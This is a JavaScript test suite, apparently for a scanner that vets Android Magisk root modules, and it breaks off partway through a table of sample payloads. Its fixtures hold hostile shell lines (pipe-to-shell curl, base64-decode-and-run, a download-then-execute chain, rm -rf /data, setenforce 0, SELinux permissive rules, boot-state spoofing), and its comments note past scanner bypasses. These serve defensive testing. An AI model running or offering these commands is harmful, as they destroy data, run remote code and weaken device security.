const P7_LIVE_DECOY = 'echo "magiskpolicy --live"; magiskpolicy --live "allow su * fs:file { execute_no_trans }"';

/** 数一行里到底有几个匹配 —— 用来证明「基数」类夹具本身不是空转。 */
function matchCount(ruleId, line) {
  const r = RULES_BY_ID[ruleId];
  assert.ok(r, `规则 ${ruleId} 不存在`);
  const flags = r.pattern.flags.includes('g') ? r.pattern.flags : r.pattern.flags + 'g';
  const re = new RegExp(r.pattern.source, flags);
  let n = 0, m;
  while ((m = re.exec(line)) !== null) {
    n++;
    if (m.index === re.lastIndex) re.lastIndex++;
  }
  return n;
}

test('fix3-P7：echo 前缀 decoy 不许让同行真命令静默（VERIFIED_BOOT_SPOOF 实测曾 0 findings → low → auto-approve）', () => {
  assert.ok(matchCount('VERIFIED_BOOT_SPOOF', P7_BOOT_DECOY) >= 1, '夹具必须真命中，否则下面的断言是空转');
  const h = hits('VERIFIED_BOOT_SPOOF', P7_BOOT_DECOY);
  assert.equal(h.length, 1, `一行只出 1 条发现，但必须有：${JSON.stringify(h)}`);
  assert.equal(h[0].severity, 'high');
  assert.equal(h[0].line, 1);
  assert.match(h[0].snippet, /resetprop -w ro\.boot\.verifiedbootstate/, 'snippet 要指名造成结论的那个匹配');
  assert.ok(!/echo/.test(h[0].snippet), `证据不许是被豁免的最左 decoy：${h[0].snippet}`);
  // 单独一行真命令的行为必须原样保留（基数与档位都没被这次改动动过）
  const alone = hits('VERIFIED_BOOT_SPOOF', 'resetprop -w ro.boot.verifiedbootstate green');
  assert.equal(alone.length, 1, 'resetprop 单独一行仍然只报 1 条');
  assert.equal(alone[0].severity, 'high');
});

test('fix3-P7：同行 decoy 的 magiskpolicy --live 照样 high，且 decoy 动词不许顶掉真动词的 snippet', () => {
  const line = 'echo "usage: supolicy --live 未使用"; magiskpolicy --live "allow su * *"';
  assert.equal(matchCount('MAGISK_POLICY_LIVE', line), 2, '夹具必须在一行里造出两个匹配');
  const h = hits('MAGISK_POLICY_LIVE', line);
  assert.equal(h.length, 1, '基数不变：一行一条');
  assert.equal(h[0].severity, 'high');
  assert.match(h[0].snippet, /magiskpolicy --live/);
  assert.ok(!/supolicy/.test(h[0].snippet), `snippet 必须是产生结论的那个匹配，不是最左的 supolicy decoy：${h[0].snippet}`);
  const h2 = hits('MAGISK_POLICY_LIVE', P7_LIVE_DECOY);
  assert.equal(h2.length, 1);
  assert.equal(h2[0].severity, 'high', P7_LIVE_DECOY);
});

test('fix3-P7：decoy rm 行的 severity 取「非豁免匹配里的最大档」（实测曾 medium，裸 rm -rf /data 是 high）', () => {
  const bare = hits('RM_RF_MUTABLE', 'rm -rf /data');
  assert.equal(bare.length, 1);
  assert.equal(bare[0].severity, 'high', '基准：裸 rm -rf /data 一直是 high');
  const decoy = hits('RM_RF_MUTABLE', 'rm -rf "$TMP_PATH"; rm -rf /data');
  assert.equal(decoy.length, 1, '基数不变：一行一条');
  assert.equal(decoy[0].severity, 'high', `写在前面那半行不许把 /data 降成 medium：${JSON.stringify(decoy)}`);
});

test('fix3-P7：豁免是逐个匹配的 —— 只有「该行全部匹配都可豁免」才跳过整行', () => {
  // 反向哨兵（不许把工厂改成「不再豁免」）：两个匹配都落在模块自有目录 → 0 条
  assert.equal(matchCount('RM_RF_MUTABLE', 'rm -rf $MODDIR/cache; rm -rf $MODPATH/tmp'), 2);
  assert.equal(hits('RM_RF_MUTABLE', 'rm -rf $MODDIR/cache; rm -rf $MODPATH/tmp').length, 0,
    '全部匹配都可豁免时必须仍然跳过整行');
  // 注释行里的两个 resetprop 都只说明不执行 → 0 条
  assert.ok(matchCount('VERIFIED_BOOT_SPOOF', '# resetprop ro.boot.verifiedbootstate green 与 resetprop ro.boot.flash.locked 0') >= 1);
  assert.equal(hits('VERIFIED_BOOT_SPOOF', '# resetprop ro.boot.verifiedbootstate green 与 resetprop ro.boot.flash.locked 0').length, 0);
  // 一个可豁免 + 一个不可豁免 → 1 条，且按不可豁免那个定档
  const mixed = hits('RM_RF_MUTABLE', 'rm -rf $MODDIR/cache; rm -rf /system');
  assert.equal(mixed.length, 1);
  assert.equal(mixed[0].severity, 'high', JSON.stringify(mixed));
});

test('fix3-P7：同一个根因的另一条通道 —— 贪心 [^\\n]* 不许把同行两条命令并成一个匹配', () => {
  // 工厂改完仍然打不中的形状：pattern 里动词与键名之间是贪心的 `[^\n]*`，一行里的两条命令被并成
  // **一个**匹配（实测 matches=1 → 0 findings），于是「可豁免的前半行」把后半行的真载荷一起吃掉。
  // 修法与 MAGISK_POLICY_LIVE 的 `[^|;\n]*` 同例：动词与键名锁在同一条命令里。
  const boot = 'echo "resetprop -w ro.boot.verifiedbootstate green"; resetprop -w ro.boot.verifiedbootstate green';
  assert.equal(matchCount('VERIFIED_BOOT_SPOOF', boot), 2, '不许并成一个匹配，否则豁免判断只能看最左那条');
  const dbg = 'echo "setprop ro.secure 0"; setprop ro.secure 0';
  assert.equal(matchCount('DEBUGGABLE_ENABLE', dbg), 2, 'DEBUGGABLE_ENABLE 是同一条 pattern 形状的第二个受害者');
  const h = hits('DEBUGGABLE_ENABLE', dbg);
  assert.equal(h.length, 1);
  assert.equal(h[0].severity, 'medium', '与脚本侧规则同档：medium（high 已判给启动状态伪造）');
  assert.equal(h[0].snippet, 'setprop ro.secure 0', `证据要指名真命令：${JSON.stringify(h)}`);
});

test('fix3-P7：基数不变 —— 同一行同一规则最多 1 条发现（朴素「每个匹配都报」在真实包上实测 +10,046 条，其中 +10,001 条是 SUSPICIOUS_DOMAIN）', () => {
  const line = 'var a="https://a.tk/1",b="https://b.xyz/2",c="https://c.top/3";'.repeat(8);
  assert.ok(matchCount('SUSPICIOUS_DOMAIN', line) > 10, `夹具必须造出 >10 个匹配，实际 ${matchCount('SUSPICIOUS_DOMAIN', line)}`);
  const h = hits('SUSPICIOUS_DOMAIN', line);
  assert.equal(h.length, 1, '压缩过的 bundle 一行命中几十次也只许报 1 条');
  assert.equal(h[0].severity, 'medium');
});

test('fix3-P7：maxPerFile 语义保留 —— 上限按行计（每行一条），不是按匹配计', () => {
  const text = Array.from({ length: 30 }, (_, i) => `rm -rf /data # 第 ${i} 行`).join('\n');
  const h = hits('RM_RF_MUTABLE', text);
  assert.equal(h.length, 20, `默认 maxPerFile=20，按行计：实际 ${h.length}`);
  assert.equal(new Set(h.map((f) => f.line)).size, 20, '20 条要来自 20 个不同行号');
  assert.deepEqual(h.map((f) => f.line), [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]);
});

test('fix3-P7：定档取最大时 snippet 跟着最重的那个匹配走（HARDCODED_IP 内外网同行）', () => {
  const h = hits('HARDCODED_IP', 'ping 10.0.0.1 && curl http://203.0.113.9/x');
  assert.equal(h.length, 1);
  assert.equal(h[0].severity, 'medium', '内网 low 在前、公网 medium 在后 —— 结论取最大档');
  assert.equal(h[0].snippet, '203.0.113.9', `snippet 必须指名公网 IP：${h[0].snippet}`);
  assert.ok(!/10\.0\.0\.1/.test(h[0].snippet), '不许把最左的低档匹配写成风险本体');
});

test('fix3-P7 端到端：两行 echo decoy 组成的 service.sh 不再被判 low、不再自动放行', async () => {
  const r = await scanToReport(makeModuleZip({ id: 'eval.f3p7', files: [
    ['module.prop', moduleProp('eval.f3p7')],
    ['service.sh', `#!/system/bin/sh\n${P7_BOOT_DECOY}\n${P7_LIVE_DECOY}\n`],
  ] }), { changeType: 'first' });
  const hi = r.findings.filter((f) => f.severity === 'high');
  assert.equal(hi.length, 2, JSON.stringify(r.findings.map((f) => `${f.ruleId}@${f.line}:${f.snippet}`)));
  assert.equal(r.riskLevel, 'high');
  assert.equal(r.decision.action, 'block', '旧行为实测 low → auto-approve');
  for (const f of hi) assert.ok(!/^\s*echo\b/.test(f.snippet), `证据指名了 decoy 而不是真命令：${f.snippet}`);
});

// —— P8：permissive / typepermissive ——
// 简报实测：`typepermissive su;` 与 `permissive magisk;` 在 cd79136 上是 0 hits。
// 它比任何 allow 都弱（该域的所有拒绝只记日志不拦），却没有规则。
// 坑（简报已确认）：SELINUX_POLICY_RELAX 的 pattern 硬要求动词后面出现 `{`，
// 所以「把动词表从 allow 扩成 allow|permissive|typepermissive」打不中 —— 必须自成一支。

const P8_SAFE = [
  '# permissive su;',                                  // 整行注释：仍然豁免
  '   # 说明：本模块不会 typepermissive su;',
  'description=permissive license',                    // 英文说明里的形容词不是策略语句
  'ui_print "- 我们不写 permissive 规则"',
  'permissive_note=1',                                 // 属性键名里含这个词
  'enforce su;',
  'getenforce',
];

test('fix3-P8：typepermissive / permissive 必须有规则命中 high（实测曾 0 hits → low → auto-approve）', () => {
  const hit = [
    'typepermissive su;',
    'permissive magisk;',
    '  typepermissive su;',
    'permissive { su magisk };',
    'typepermissive untrusted_app;',
    'echo "本模块不 typepermissive su;"; typepermissive su;',   // P7：decoy 顶不掉真语句
    'MODDIR=${0%/*}; typepermissive su;',
  ];
  for (const line of hit) {
    const h = hits('SELINUX_TYPE_PERMISSIVE', line);
    assert.equal(h.length, 1, `应当命中且只命中 1 条：${line} —— 实际 ${JSON.stringify(h)}`);
    assert.equal(h[0].severity, 'high', `permissive 是 high：${line}`);
    assert.equal(h[0].category, 'root');
    assert.match(h[0].snippet, /(?:type)?permissive/, `证据要指名这半句：${h[0].snippet}`);
  }
  // RELAX 那条规则不许顺手把 permissive 也报一遍（两条规则各自说话，snippet 才对得上）
  assertNoHit('SELINUX_POLICY_RELAX', 'typepermissive su;', 'RELAX 硬要求 `{`，这条由新规则负责');
});

test('fix3-P8：注释行与英文说明里的 permissive 仍然豁免（假阳性烧的是人工容量）', () => {
  for (const line of P8_SAFE) {
    assertNoHit('SELINUX_TYPE_PERMISSIVE', line, line);
  }
  // 反向哨兵：豁免只认「整行注释 / 说明位」，行尾 # 关不掉策略语句（fix2-P6 同一判据）
  assert.equal(hits('SELINUX_TYPE_PERMISSIVE', 'typepermissive su; # 行尾说明').length, 1);
});

test('fix3-P8 端到端：sepolicy.rule 里一行 typepermissive su; 不再被判 low', async () => {
  const r = await scanToReport(makeModuleZip({ id: 'eval.f3p8', files: [
    ['module.prop', moduleProp('eval.f3p8')],
    ['sepolicy.rule', '# 收紧自家域的日志噪音\ndontaudit su su:file read;\ntypepermissive su;\n'],
  ] }), { changeType: 'first' });
  const f = r.findings.find((x) => x.ruleId === 'SELINUX_TYPE_PERMISSIVE');
  assert.ok(f, JSON.stringify(r.findings.map((x) => x.ruleId)));
  assert.equal(f.file, 'sepolicy.rule');
  assert.equal(f.line, 3, '注释行与 dontaudit 行都不许占用行号');
  assert.equal(f.severity, 'high');
  assert.equal(r.riskLevel, 'high');
  assert.equal(r.decision.action, 'block');
  assert.match(renderMarkdown(r), /SELINUX_TYPE_PERMISSIVE|关闭整个域/, 'Markdown 里要看得见这条结论');
});

test('fix3-P8：新规则接进规则表且分类/级别与简报一致，合法模块夹具仍然 0 命中', () => {
  assert.ok(CONTENT_RULES.some((r) => r.id === 'SELINUX_TYPE_PERMISSIVE'), '不进 CONTENT_RULES 的话 scanContent 根本不会跑它');
  const rule = RULES_BY_ID.SELINUX_TYPE_PERMISSIVE;
  assert.equal(rule.category, 'root');
  assert.equal(rule.severity, 'high');
  assert.ok(rule.title && rule.advice);
  assert.ok(CATEGORY_LABEL[rule.category], '分类必须有中文标题，否则报告分组是空的');
  for (const line of P8_SAFE) assert.equal(rule.scan('sepolicy.te', line).length, 0, line);
});

// —— P9：属性文件里直写削弱安全的键 ——
// 简报实测：`ro.debuggable=1` 写进 system.prop 是 0 hits，而同一意图走 resetprop/setprop 是
// DEBUGGABLE_ENABLE medium。同一意图、换个机制就完全免检，是一条平凡可达的绕行通道。
// 范围必须窄：只认那四个具名键的**削弱值**，不是「任何 ro. 键」。

test('fix3-P9：.prop 直写四个具名削弱键必须命中 medium（实测曾 0 hits → low → auto-approve）', () => {
  const hit = [
    'ro.debuggable=1',
    'ro.secure=0',
    'ro.adb.secure=0',
    'service.adb.root=1',
    '  ro.debuggable = 1',                 // 缩进与等号两侧空白不改属性语义
    'ro.secure=0   # 说明写在行尾',
  ];
  for (const line of hit) {
    const h = hits('PROP_SECURITY_WEAKEN', line);
    assert.equal(h.length, 1, `应当命中且只命中 1 条：${line} —— 实际 ${JSON.stringify(h)}`);
    assert.equal(h[0].severity, 'medium', `medium —— 镜像脚本侧 DEBUGGABLE_ENABLE，high 已判给启动状态伪造：${line}`);
    assert.equal(h[0].category, 'root');
  }
  // 反向哨兵：范围不许扩成「任何 ro. 键」或「任何 =0/=1」
  const safe = [
    'ro.product.model=Pixel7',             // 正经模块改机型
    'debug.sf.hw=1',                       // 图形性能开关，不是安全档位
    'ro.debuggable=0',                     // no-op：这是默认安全值
    'ro.secure=1',
    'ro.adb.secure=1',
    'service.adb.root=0',
    'ro.build.version.security_patch=2021-01-05',
    'ro.my.mod.enabled=1',
    'persist.sys.usb.config=adb',          // 仍是不覆盖的缺口（见 PROP_BOOT_SPOOF 的说明）
    'description=ro.debuggable=1 只是说明文字',
    '# ro.debuggable=1',
    'getprop ro.debuggable',
    'ro.debuggable=12',                    // 不是那个具名值
  ];
  for (const line of safe) assertNoHit('PROP_SECURITY_WEAKEN', line, line);
  // DEBUGGABLE_ENABLE 管脚本侧、本条管 .prop 侧：同一行只该由一条说话
  assertNoHit('DEBUGGABLE_ENABLE', 'ro.debuggable=1', '脚本侧规则不越界到属性文件');
});

test('fix3-P9 端到端：只在 system.prop 里写 ro.debuggable=1 的模块不再判 low', async () => {
  const r = await scanToReport(makeModuleZip({ id: 'eval.f3p9', files: [
    ['module.prop', moduleProp('eval.f3p9')],
    ['system.prop', 'ro.debuggable=1\nro.adb.secure=0\n'],
  ] }), { changeType: 'first' });
  const f = r.findings.filter((x) => x.ruleId === 'PROP_SECURITY_WEAKEN');
  assert.equal(f.length, 2, JSON.stringify(r.findings.map((x) => `${x.ruleId}@${x.file}:${x.line}`)));
  assert.deepEqual(f.map((x) => x.line), [1, 2], '行号要逐行对上，人工复核才找得到是哪两行');
  assert.ok(r.counts.medium >= 2, '两条 medium 必须参与定级：' + JSON.stringify(r.counts));
  assert.equal(r.riskLevel, 'medium', 'medium —— 与脚本侧同档');
  assert.equal(r.decision.action, 'block', '旧行为实测 low → auto-approve');
  // 反向哨兵：同一份夹具把四个键换成机型与图形开关，必须回到 low 并自动放行
  const ok = await scanToReport(makeModuleZip({ id: 'eval.f3p9ok', files: [
    ['module.prop', moduleProp('eval.f3p9ok')],
    ['system.prop', 'ro.product.model=Pixel7\ndebug.sf.hw=1\nro.debuggable=0\n'],
  ] }), { changeType: 'first' });
  assert.ok(!ok.findings.some((x) => x.ruleId === 'PROP_SECURITY_WEAKEN'), JSON.stringify(ok.findings));
  assert.equal(ok.riskLevel, 'low');
  assert.equal(ok.decision.action, 'auto-approve', 'P9 不许把正经改属性变成人工排队');
});

test('fix3-P9：新规则接进规则表，且 .prop 通道现在由两条规则分头覆盖', () => {
  assert.ok(CONTENT_RULES.some((r) => r.id === 'PROP_SECURITY_WEAKEN'));
  const rule = RULES_BY_ID.PROP_SECURITY_WEAKEN;
  assert.equal(rule.category, 'root');
  assert.equal(rule.severity, 'medium');
  assert.ok(rule.title && rule.advice);
  assert.ok(!/persist\./.test(rule.title + rule.advice), '文案不许承诺覆盖 persist.*：' + rule.title + rule.advice);
  // 简报 F4 那句实测原句：boot 键走 PROP_BOOT_SPOOF，另两行现在由本条兜住
  const fs = scanContent('system.prop', 'ro.boot.verifiedbootstate=green\nro.debuggable=1\nro.secure=0');
  assert.deepEqual(fs.map((f) => `${f.ruleId}:${f.severity}`).sort(),
    ['PROP_BOOT_SPOOF:high', 'PROP_SECURITY_WEAKEN:medium', 'PROP_SECURITY_WEAKEN:medium'].sort(),
    JSON.stringify(fs.map((f) => `${f.ruleId}@${f.line}`)));
});

// ---------------------------------------------------------------------------
// ⑪ 第四轮修复（fix4）：P12 行首锚点 / P13 属性文件的「脚本写出」一支 / P14 锚点闭包
// ---------------------------------------------------------------------------
//
// 简报实测（d235927，单行输入；`0 命中` = 载荷对扫描器隐形）：
//   0 命中  SELINUX_POLICY_RELAX   sepolicy.rule     x=1; allow su * * { execute };
//   0 命中  SELINUX_POLICY_RELAX   post-fs-data.sh   printf "allow su * * { execute }\n" >> /data/adb/magisk/policy
//   0 命中  PROP_SECURITY_WEAKEN   service.sh        printf "ro.debuggable=1\n" >> /data/adb/modules/x/system.prop
//   0 命中  PROP_BOOT_SPOOF        service.sh        echo "ro.boot.verifiedbootstate=green" >> system.prop
//   high    VERIFIED_BOOT_SPOOF    service.sh        x=1; resetprop -w ro.boot.verifiedbootstate green
// 用 `^\s*` 表达「这一行的开头就是载荷」的规则会被行前缀绕过，用左边界类的不会 ——
// 这是同一个形状第三次复发（fix1 的注释豁免、fix3-P7 的首匹配、本轮的锚点）。
// P12/P13 补这一族的两个洞，P14 把形状关掉：**沉默必须有声明，声明必须有 witness**。

// —— P12：SELINUX_POLICY_RELAX 不许要求行首 ——
const P12_HIT = [
  'x=1; allow su * * { execute };',
  'printf "allow su * * { execute }\\n" >> /data/adb/magisk/policy',
  'printf "allow su * fs:file { read write open execute };\\n" >> sepolicy.rule',
  'echo "allow su * * { execute }" > /data/adb/service.d/p',            // 带写出就不是说明位
  'MODDIR=${0%/*}; allow su * * { execute };',
  'dontaudit su su:file read; allow su * * { execute };',
  'ui_print "先看一眼"; allow su magisk su:process { execmem };',
  'allow su * * { execute } # 行尾说明关不掉这一行（fix2-P6 同判据）',
];

// 豁免侧的形状（本轮只许往这里加，不许往 P12_HIT 那边收）：
// 整行注释 / 纯打印说明位 / 变量与 key=value 的赋值位。
const P12_SAFE = [
  '# allow su * * { execute };',
  '   # 注释：allow su * * { execute } 只是说明文字',
  'echo "allow su * fs:file { execute }"',
  'SELINUX_ALLOW="allow su * fs:file { execute }"',
  'description=allow su * * { execute } 是文案',
  'auditallow magisk magisk:process *;',           // 词里含 allow，边界类不认 i
  'dontaudit su su:file read;',
  'allow su shell:process transition;',            // 没有权限块
  'allow su * fs:file { };',
  'genfscon magiskfs /data/adb/magisk u:object_r:magisk_file:s0',
];

test('fix4-P12：allow 规则出现在行中间也必须命中 high（实测曾 0 命中 → low → auto-approve）', () => {
  for (const line of P12_HIT) {
    const h = hits('SELINUX_POLICY_RELAX', line);
    assert.equal(h.length, 1, `应当命中且只命中 1 条：${line} —— 实际 ${JSON.stringify(h)}`);
    assert.equal(h[0].severity, 'high', `RELAX 是 high：${line}`);
    assert.equal(h[0].category, 'root');
  }
});

test('fix4-P12：证据要指名 allow 那一句，不许指名前缀的 printf/echo', () => {
  for (const line of [
    'x=1; allow su * * { execute };',
    'printf "allow su * * { execute }\\n" >> /data/adb/magisk/policy',
    'ui_print "先看一眼"; allow su magisk su:process { execmem };',
  ]) {
    const [f] = assertHit('SELINUX_POLICY_RELAX', line, line);
    assert.match(f.snippet, /allow\s+su/, `snippet 要指到授权那一句：${f.snippet}`);
    assert.ok(!/^(?:printf|echo|ui_print|x=1)/.test(f.snippet),
      `snippet 被前缀那半行顶掉了（fix3-P7 同判据，contract 4）：${f.snippet}`);
  }
});

test('fix4-P12：豁免侧只收窄到「整行注释 / 说明位 / 赋值位」—— 行内 # 依然不许关嘴', () => {
  for (const line of P12_SAFE) assertNoHit('SELINUX_POLICY_RELAX', line, line);
  // 反向哨兵：豁免只认整行注释；载荷之后出现的 # 是策略文本的一部分，不是注释
  assertHit('SELINUX_POLICY_RELAX', 'allow su * * { execute } # 只是说明');
  assertHit('SELINUX_POLICY_RELAX', 'x=1; allow su * * { execute }; # 只是说明');
  // fix3 报告 §8.1 披露的那三条，本轮必须一起闭掉
  assertHit('SELINUX_POLICY_RELAX', 'echo "本模块不授权执行"; allow su * fs:file { execute_no_trans };');
  assertHit('SELINUX_POLICY_RELAX', 'dontaudit su su:file read; allow su * * { execute };');
  assertHit('SELINUX_POLICY_RELAX', 'MODDIR=${0%/*}; allow su * * { execute };');
});

test('fix4-P12 端到端：post-fs-data.sh 里 printf >> policy 的模块不再判 low', async () => {
  const r = await scanToReport(makeModuleZip({ id: 'eval.f4p12', files: [
    ['module.prop', moduleProp('eval.f4p12')],
    ['post-fs-data.sh', '#!/system/bin/sh\nprintf "allow su * * { execute }\\n" >> /data/adb/magisk/policy\n'],
  ] }), { changeType: 'first' });
  const f = r.findings.find((x) => x.ruleId === 'SELINUX_POLICY_RELAX');
  assert.ok(f, JSON.stringify(r.findings.map((x) => x.ruleId)));
  assert.equal(f.severity, 'high');
  assert.equal(f.line, 2);
  assert.equal(r.riskLevel, 'high', '旧行为实测 low → auto-approve');
  assert.equal(r.decision.action, 'block');
});

// —— P13：属性文件规则需要「脚本写出」这一支 ——
const P13_BOOT_HIT = [
  'printf "ro.boot.verifiedbootstate=green\\n" >> /data/adb/modules/x/system.prop',
  'x=1; printf "ro.boot.vbmeta.device_state=unlocked\\n" >> $MODDIR/system.prop',
  'echo "ro.boot.flash.locked=0" >> system.prop',
  'echo ro.boot.veritymode=enforcing > /data/adb/modules/m/system.prop',
  'cat f > /data/adb/modules/m/system.prop && echo "ro.boot.verifiedbootstate=green" >> /data/adb/modules/m/system.prop',
];
const P13_BOOT_SAFE = [
  '# printf "ro.boot.verifiedbootstate=green\\n" >> /data/adb/modules/x/system.prop',
  'echo "ro.boot.verifiedbootstate=green"',                        // 只是打印，没有写出动作
  'getprop ro.boot.verifiedbootstate',
  'ui_print "- 本模块不会写 ro.boot.verifiedbootstate=green"',
  'printf "ro.product.model=Pixel7\\n" >> f',                      // 键不在四个里
  'printf "ro.debuggable=1\\n" >> f',                              // 那是 PROP_SECURITY_WEAKEN 的键
  'printf "ro.boot.verifiedbootstatex=green\\n" >> f',             // 不是那个键名
  'description=ro.boot.verifiedbootstate=green 这个模块不上锁',
];

const P13_WEAK_HIT = [
  'printf "ro.debuggable=1\\n" >> /data/adb/modules/x/system.prop',
  'x=1; printf "ro.secure=0\\n" >> /data/adb/service.d/x.prop',
  'echo "ro.adb.secure=0" >> custom.prop',
  'echo service.adb.root=1 >> $MODDIR/system.prop',
];
const P13_WEAK_SAFE = [
  '# printf "ro.debuggable=1\\n" >> f',
  'echo "ro.debuggable=1"',                                        // 没有写出
  'printf "ro.debuggable=12\\n" >> f',                             // 不是那个具名值
  'printf "ro.debuggable=0\\n" >> f',                              // no-op：默认安全值
  'printf "ro.product.model=Pixel7\\n" >> f',
  'printf "persist.sys.usb.config=adb\\n" >> f',                   // 仍是已披露的缺口
  'printf "ro.secure=1\\n" >> f',
  'description=ro.debuggable=1 只是说明文字',
];

test('fix4-P13：PROP_BOOT_SPOOF 必须有「脚本写进属性文件」那一支，severity 仍是 high（实测曾 0 命中）', () => {
  for (const line of P13_BOOT_HIT) {
    const h = hits('PROP_BOOT_SPOOF', line);
    assert.ok(h.length > 0, `PROP_BOOT_SPOOF 应当命中：${line} —— 实际 0 命中`);
    assert.equal(h[0].severity, 'high', `启动/完整性状态伪造是 high（简报已拍定）：${line}`);
  }
  for (const line of P13_BOOT_SAFE) assertNoHit('PROP_BOOT_SPOOF', line, line);
  // 行首那一支不许因为加了第二支而退化：真实 .prop 条目照常命中
  for (const line of ['ro.boot.verifiedbootstate=green', 'ro.boot.flash.locked=0', '  ro.boot.veritymode=enforcing']) {
    assertHit('PROP_BOOT_SPOOF', line, line);
  }
  // 键表不许扩
  assertNoHit('PROP_BOOT_SPOOF', 'printf "persist.sys.bootloader.locked=0\\n" >> f', '非 boot 家族仍是不覆盖的缺口');
});

test('fix4-P13：PROP_SECURITY_WEAKEN 同形那一支，severity 仍是 medium，四个具名键不许扩', () => {
  for (const line of P13_WEAK_HIT) {
    const h = hits('PROP_SECURITY_WEAKEN', line);
    assert.ok(h.length > 0, `PROP_SECURITY_WEAKEN 应当命中：${line} —— 实际 0 命中`);
    assert.equal(h[0].severity, 'medium', `medium —— 镜像脚本侧 DEBUGGABLE_ENABLE：${line}`);
  }
  for (const line of P13_WEAK_SAFE) assertNoHit('PROP_SECURITY_WEAKEN', line, line);
  for (const line of ['ro.debuggable=1', 'ro.secure=0', 'ro.adb.secure=0', 'service.adb.root=1']) {
    assertHit('PROP_SECURITY_WEAKEN', line, line);
  }
  // 两条规则各管各的键，同一行只该由一条说话
  assertNoHit('PROP_BOOT_SPOOF', 'printf "ro.debuggable=1\\n" >> f', '削弱键归 P9 那条');
  assertNoHit('PROP_SECURITY_WEAKEN', 'printf "ro.boot.verifiedbootstate=green\\n" >> f', 'boot 键归 F4 那条');
});

test('fix4-P13 端到端：customize.sh 里 printf >> system.prop 的模块不再判 low，且改机型仍自动放行', async () => {
  // 用**相对路径**的 system.prop —— `>> $MODDIR/system.prop` 那种形状至少还被邻居规则 MODDIR_RUNTIME_WRITE
  // 抓着（实测 eval.f4p14：high，但三条目标规则自己全是 0 命中）；而 customize.sh 刷写时工作目录就是模块目录，
  // `printf … >> system.prop` 是它最惯用的写法，P13 之前整条包里一条发现都没有（low → auto-approve）。
  const r = await scanToReport(makeModuleZip({ id: 'eval.f4p13', files: [
    ['module.prop', moduleProp('eval.f4p13')],
    ['customize.sh', '#!/system/bin/sh\nui_print "- writing props"\nprintf "ro.boot.verifiedbootstate=green\\n" >> system.prop\nprintf "ro.debuggable=1\\n" >> system.prop\n'],
  ] }), { changeType: 'first' });
  const prop = r.findings.filter((f) => f.ruleId === 'PROP_BOOT_SPOOF' || f.ruleId === 'PROP_SECURITY_WEAKEN');
  assert.deepEqual(prop.map((f) => `${f.ruleId}@${f.line}:${f.severity}`).sort(),
    ['PROP_BOOT_SPOOF@3:high', 'PROP_SECURITY_WEAKEN@4:medium'].sort(),
    JSON.stringify(r.findings.map((f) => `${f.ruleId}@${f.line}`)));
  assert.equal(r.riskLevel, 'high', '旧行为实测 low → auto-approve');
  assert.equal(r.decision.action, 'block');
  // 反向哨兵：同一形状写合法键，必须回到 low + auto-approve
  // （注意这里也写相对路径：`>> $MODDIR/…` 会被既有规则 MODDIR_RUNTIME_WRITE 判 high，与本条要证的不是同一件事）
  const ok = await scanToReport(makeModuleZip({ id: 'eval.f4p13ok', files: [
    ['module.prop', moduleProp('eval.f4p13ok')],
    ['customize.sh', '#!/system/bin/sh\nui_print "- writing props"\nprintf "ro.product.model=Pixel7\\n" >> system.prop\n'],
  ] }), { changeType: 'first' });
  assert.ok(!ok.findings.some((f) => f.ruleId === 'PROP_BOOT_SPOOF' || f.ruleId === 'PROP_SECURITY_WEAKEN'),
    JSON.stringify(ok.findings.map((f) => f.ruleId)));
  assert.equal(ok.riskLevel, 'low');
  assert.equal(ok.decision.action, 'auto-approve');
});

// —— P14：锚点闭包 ——
// 三条硬要求：
//   ① 每条 line 规则都要声明 anchor ∈ {'line-start','anywhere'}；缺声明 = 红，**不许跳过**
//      （「缺就跳过」正是装饰性守卫的形状，变异 (c) 就是冲它来的）；
//   ② 声明 anywhere 的规则必须扛住一行前缀（ANCHOR_PREFIX + 已知载荷）；声明 line-start 的规则
//      必须指名 sibling，并且同一载荷的「脚本写出」形态在 sibling 上真的命中；
//   ③ 删掉失败的那条规则不算修好：固定的必备 id 清单 + 规则数地板 + witness 表与规则表互为定义，
//      再加覆盖度地板（这张表跳过的规则数必须是 0）。
// 这里不重写任何模式匹配：断言全部走 shipped 规则的 scan()。
const ANCHOR_PREFIX = 'x=1; ';

const ANCHOR_WITNESS = {
  RM_RF_MUTABLE: { payload: 'rm -rf /data' },
  PIPE_TO_SHELL: { payload: 'curl -s https://abc.cc/x.sh | sh' },
  EXEC_BUNDLED_FILE: { payload: 'sh $MODDIR/payload.bin' },
  EXEC_INDIRECT: { payload: 'sh $PAYLOAD' },
  MODDIR_RUNTIME_WRITE: { payload: 'unzip -q -d $MODDIR /sdcard/p.zip' },
  DOWNLOAD_TO_STDOUT: { payload: 'wget -q -O- https://abc.cc/x' },
  // Task 3：跨行规则的 witness 载荷必须是**一整篇文本**（hits 把整个 payload 当一篇文本喂给 scan()），
  // 一条完整的「下载 → 落盘 → 执行」链恰好命中 1 条；前缀形态（ANCHOR_PREFIX 只落在第一行）仍 1 条 ——
  // 这两件事一起证明：这一支的锚点是「逻辑行里的命令位」，不是「物理行的第一个字符」。
  DOWNLOAD_THEN_EXEC: {
    payload: 'curl https://abc.cc/x -o /data/local/tmp/u\nchmod 700 /data/local/tmp/u\n/data/local/tmp/u\n',
  },
  OBFUSCATED_DECODE_EXEC: { payload: 'echo $B64 | base64 -d | sh' },
  OBFUSCATED_DECODE_ONLY: { payload: 'echo $B64 | base64 -d > /data/local/tmp/out' },
  WRITE_SYSTEM_VENDOR: { payload: 'echo x >> /system/etc/hosts' },
  SELINUX_DISABLE: { payload: 'setenforce 0' },
  HOSTS_MODIFY: { payload: 'sed -i "s/^/#/" /system/etc/hosts' },
  SELINUX_POLICY_RELAX: { payload: 'allow su * * { execute };' },
  SELINUX_TYPE_PERMISSIVE: { payload: 'typepermissive su;' },
  MAGISK_POLICY_LIVE: { payload: 'magiskpolicy --live "allow su * *"' },
  VERIFIED_BOOT_SPOOF: { payload: 'resetprop -w ro.boot.verifiedbootstate green' },
  DEBUGGABLE_ENABLE: { payload: 'setprop ro.secure 0' },
  PROP_BOOT_SPOOF: {
    payload: 'ro.boot.verifiedbootstate=green',
    prefixed: 'printf "ro.boot.verifiedbootstate=green\\n" >> /data/adb/modules/x/system.prop',
  },
  PROP_SECURITY_WEAKEN: {
    payload: 'ro.debuggable=1',
    prefixed: 'printf "ro.debuggable=1\\n" >> /data/adb/modules/x/system.prop',
  },
  HARDCODED_IP: { payload: 'ping -c1 8.8.8.8' },
  SUSPICIOUS_DOMAIN: { payload: 'curl -s https://track.xyz/p' },
  NETWORK_FETCH: { payload: 'curl -s https://example.com/x' },
